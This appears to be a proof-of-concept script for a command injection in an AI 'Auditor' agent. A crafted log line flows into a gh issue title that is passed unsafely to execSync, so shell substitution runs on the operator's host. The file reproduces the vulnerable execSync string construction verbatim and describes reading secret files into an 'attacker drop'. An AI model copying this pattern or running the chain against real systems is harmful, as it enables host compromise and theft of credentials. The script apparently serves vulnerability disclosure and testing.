// Realistic end-to-end PoC for the crewly Auditor create_github_issue command injection.
//
// Chain modelled (crewly issue #178 — "Auditor auto-triage: periodic monitoring + automatic
// GitHub issue creation"):
//   1. An attacker gets a crafted line into activity the read-only Auditor reviews
//      (a log line, a commit message, a task note — here: /work/audited-activity.log).
//   2. The Auditor summarises a finding and AUTO-FILES a GitHub issue, using the finding text
//      as the issue title. (We derive the title from the log exactly as an auditor would.)
//   3. create_github_issue builds a `gh` shell string with only `"` escaped and runs execSync,
//      so the attacker's `$(...)` in that line executes on the operator's host.
//
// Payloads are BENIGN: they only read MOCK secret files we planted and copy them to a local
// "attacker drop" file, and write a marker "backdoor" file. No real secrets, no network.
import { readFileSync as rf } from 'node:fs';
import { execSync } from 'node:child_process';

// ---- Step 1+2: the Auditor ingests audited activity and derives an issue title from it ----
const log = rf('/work/audited-activity.log', 'utf8');
const findingLine = log.split('\n').find(l => l.includes('[Critical]')) || '';
// An auditor turns the finding into an issue title; attacker content rides along verbatim.
const title = findingLine.replace(/^\S+\s+/, '').trim();   // drop leading timestamp
const body  = 'Auto-filed by the Auditor from audited activity. See linked session.';
const labels = ['bug', 'auditor'];
console.log('[auditor] derived issue title from audited log:');
console.log('          ' + JSON.stringify(title));

// ---- Step 3: VERBATIM create_github_issue.execute() command construction (auditor-tools.ts) ----
try {
  const searchQuery = title.replace(/\[.*?\]\s*/, '').slice(0, 50);   // dedup sink (fires first)
  try {
    execSync(`gh issue list --state open --search "${searchQuery.replace(/"/g, '\\"')}" --json number,title --limit 5`,
      { encoding: 'utf-8', timeout: 15000 });
  } catch { /* gh unavailable — $() already executed during shell parsing */ }
  const labelFlag = labels.map(l => `--label "${l}"`).join(' ');
  execSync(`gh issue create --title "${title.replace(/"/g, '\\"')}" --body "${body.replace(/"/g, '\\"')}" ${labelFlag}`,
    { encoding: 'utf-8', timeout: 30000 });
} catch (e) {
  console.log('[gh] invocation failed (expected: no gh auth/network in sandbox) — injection already ran');
}
